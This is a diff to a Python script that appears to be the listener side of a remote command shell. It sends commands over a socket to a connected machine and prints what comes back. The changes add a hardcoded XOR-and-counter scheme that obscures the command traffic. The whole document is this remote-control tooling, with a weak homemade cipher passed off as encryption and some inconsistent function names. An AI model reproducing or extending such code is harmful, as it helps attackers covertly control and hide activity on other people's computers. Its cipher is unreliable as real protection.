@@ -26,15 +26,18 @@ def string_to_ascii(s):
 
 # bytes to list of int
 def bytes_to_int_list(b_s):
-    ascii_code = []
-    for char in b_s:
-        ascii_code.append(int(char))
-    return ascii_code
+    int_bytes = []
+    for byte in b_s:
+        int_bytes.append(int(byte))
+    return int_bytes
 
 def int_list_to_bytes(i_l):
     byte_string = b""
     for int_val in i_l:
-        byte_string += int_val.to_bytes(1, 'big')
+        try:
+            byte_string += int_val.to_bytes(1, 'big')
+        except Exception:
+            print(int_val, end="")
     return byte_string
 
 # Convert list of ascii num to string
@@ -45,9 +48,8 @@ def ascii_to_string(arr):
     return s
 
 # Encode and decode list of list of int
-def cipher(blocks, IV, action):
+def cipher(blocks, IV, action, counter=1):
     IV = string_to_ascii(IV)
-    counter = 1
     for byte_list_index in range(len(blocks)):
         for byte_index in range(len(blocks[byte_list_index])):
             if action == 'd':
@@ -56,11 +58,12 @@ def cipher(blocks, IV, action):
             else:
                 blocks[byte_list_index][byte_index] += counter
                 blocks[byte_list_index][byte_index] = blocks[byte_list_index][byte_index] ^ IV[byte_index]
-        if counter + 1 <= 192:
+        if counter + 1 <= 129:
             counter += 1
         else:
             counter = 1
-    return blocks
+
+    return counter
 
 #  Create socket (allows two computers to connect)
 def socket_create():
@@ -102,13 +105,20 @@ def socket_accept():
 
 # Receives commands 
 def recv_command_res(conn):
+    counter = 1
     while True:
-        client_response = str(conn.recv(1024), 'utf-8')
-        print(client_response, end='')
+        client_response = conn.recv(8)
+        client_response = [bytes_to_int_list(client_response)]
+        counter = cipher(client_response, 'PBMDMMH3', 'd', counter)
+        try:
+            print(str(int_lists_to_bytes(client_response), 'utf-8'), end='')
+        except Exception:
+            print(int_lists_to_bytes(client_response), end='')
 
 
 #  Send commands
 def send_commands(conn):
+    counter = 1
     while True:
         cmd = input('')
         cmd += '\n'
@@ -127,8 +137,10 @@ def send_commands(conn):
                     cmd_list.append(tmp_cmd)
                     tmp_cmd = []
                 i += 1
-            cmd_list.append(tmp_cmd)
-            cipher(cmd_list, 'PBMDMMH3', 'e')
+            if len(tmp_cmd) != 0:
+                cmd_list.append(tmp_cmd)
+            print(counter)
+            counter = cipher(cmd_list, 'PBMDMMH3', 'e', counter)
             conn.send(int_lists_to_bytes(cmd_list))
             
 
